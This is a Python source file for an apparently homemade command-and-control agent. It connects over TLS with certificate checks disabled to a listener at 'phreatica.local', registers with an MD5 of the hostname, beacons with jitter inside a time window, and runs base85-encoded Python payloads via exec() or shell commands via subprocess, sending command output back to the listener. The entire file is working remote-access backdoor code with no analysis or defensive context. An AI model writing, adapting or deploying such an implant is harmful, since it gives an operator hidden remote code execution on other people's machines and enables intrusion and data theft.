import socket
import ssl
import hashlib
import json
import subprocess
import time
import base64
import datetime
from random import randrange

_LISTENER_HOST = 'phreatica.local'
_LISTENER_PORT = 1235
_LISTENER_SECRET = 'whatever'

_AGENT_BEACON_INTERVAL = 0.1
_AGENT_BEACON_JITTER = 2
_AGENT_START_TIME = datetime.time(0, 0, 0)
_AGENT_END_TIME = datetime.time(23, 0, 0)
_AGENT_CMD_TIMEOUT = 25

_AGENT_CIPHERS = 'AES128-SHA'
_AGENT_SOCKET_TIMEOUT = 2

# _AGENT_STAT_ENUM stores state machine state with following enumerations:
#
# 0     Not Associated, Attempt Association
# 1     Associated, Send beacons
# 2     Running command or payload
_AGENT_STATE_ENUM = 0


def get_uuid():
    """
    Method to generate UUID from host parameters for
    agent persistence.
    """
    uuid_components = [
        socket.gethostname()
    ]
    return hashlib.md5(''.join(uuid_components).encode()).hexdigest()


def tls_transact_msg(msg):
    """
    Method to allow the client to send a message to
    the listener using TLS.
    """
    print('SENDING: ' + msg)
    context = ssl.create_default_context()
    context.set_ciphers(_AGENT_CIPHERS)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((_LISTENER_HOST, _LISTENER_PORT))
    sock.settimeout(_AGENT_SOCKET_TIMEOUT)
    # TLS Upgrade
    ssock = context.wrap_socket(sock, server_hostname=_LISTENER_HOST)
    ssock.send(msg.encode())
    try:
        response = ssock.recv(12000)
    except ssock.timeout:
        response = False
    ssock.close()
    return response


def associate():
    """
    Association method. Creates the following packet structure:
    Association:
        _associate{ secret:"mysecret", uuid:"myuuid" }
    """
    associate_packet_stub = {
        'secret': _LISTENER_SECRET,
        'uuid': get_uuid()
    }
    associate_pkt = ('_associate' + json.dumps(associate_packet_stub))
    return tls_transact_msg(associate_pkt)


def beacon():
    """
    Beacon method. Creates the following packet structure:
    Beacon:
        _beacon{ secret:"mysecret", uuid:"myuuid" }
    """
    beacon_packet_stub = {
        'secret': _LISTENER_SECRET,
        'uuid': get_uuid()
    }
    beacon_pkt = ('_beacon' + json.dumps(beacon_packet_stub))
    return tls_transact_msg(beacon_pkt)


def respond(msg):
    """
    Respond method. Creates the following packet structure:
    Response:
        _response{ secret:"mysecret", uuid:"myuuid", data:"cmd_response" }
    """
    response_packet_stub = {
        'secret': _LISTENER_SECRET,
        'uuid': get_uuid(),
        'data': msg
    }
    response_pkt = ('_response' + json.dumps(response_packet_stub))
    print(response_pkt)
    return tls_transact_msg(response_pkt)


def run_payload(payload):
    script = base64.b85decode(payload).decode().lstrip()
    print('payload: ' + script)
    exec(script)

def run_command(command):
    command = base64.b85decode(command).decode()
    sp = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    sp_ret = sp.stdout.read()
    respond(sp_ret.decode())



associate()
while True:
    time.sleep(_AGENT_BEACON_INTERVAL + randrange(_AGENT_BEACON_JITTER))
    if (_AGENT_START_TIME <=
        datetime.datetime.now().time() <=
        _AGENT_END_TIME
        ):
        beacon_response = beacon()[9:]
        cmd = json.loads(beacon_response)
        if cmd['payload']:
            run_payload(cmd['payload'])
        if cmd['command']:
            run_command(cmd['command'])
    
